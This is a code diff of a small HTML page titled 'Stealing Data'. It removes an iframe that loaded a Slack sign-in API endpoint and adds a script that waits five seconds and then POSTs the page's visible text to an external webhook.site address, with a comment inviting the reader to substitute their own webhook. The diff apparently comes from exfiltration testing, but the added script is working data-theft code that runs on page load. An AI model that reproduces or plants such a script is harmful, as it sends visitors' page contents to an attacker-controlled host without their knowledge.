@@ -1,6 +1,24 @@
 
+
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Stealing Data</title>
+    <script>
+        setTimeout(() => {
+            fetch("https://webhook.site/c1acb3f9-304c-414d-b941-3e8094798029", {  // Replace with your webhook URL
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    data: document.body.innerText  // Capture visible page content
+                })
+            });
+        }, 5000);  // Delay to allow the page to load
+    </script>
+</head>
 <body>
-    <iframe src="https://slack.com/api/signin.findWorkspaces" width="800" height="600"></iframe>
+    <h1>Loading...</h1>
 </body>
 </html>
